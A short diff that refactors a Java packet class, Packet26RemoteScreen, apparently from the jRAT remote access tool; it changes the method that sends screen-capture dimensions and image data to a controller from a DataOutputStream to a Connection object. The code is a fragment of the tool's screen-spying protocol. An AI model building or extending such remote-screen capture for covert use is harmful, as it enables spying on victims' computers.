@@ -1,7 +1,6 @@
 package jrat.client.packets.outgoing;
 
-import jrat.common.io.StringWriter;
-import java.io.DataOutputStream;
+import jrat.client.Connection;
 
 public class Packet26RemoteScreen extends AbstractOutgoingPacket {
 
@@ -24,16 +23,16 @@ public class Packet26RemoteScreen extends AbstractOutgoingPacket {
 	}
 
 	@Override
-	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		dos.writeInt(chunkWidth);
-		dos.writeInt(chunkHeight);
-		dos.writeInt(x);
-		dos.writeInt(y);
-		dos.writeInt(width);
-		dos.writeInt(height);
+	public void write(Connection con) throws Exception {
+		con.writeInt(chunkWidth);
+		con.writeInt(chunkHeight);
+		con.writeInt(x);
+		con.writeInt(y);
+		con.writeInt(width);
+		con.writeInt(height);
 
-		dos.writeInt(buffer.length);
-		dos.write(buffer);
+		con.writeInt(buffer.length);
+		con.write(buffer);
 	}
 
 	@Override
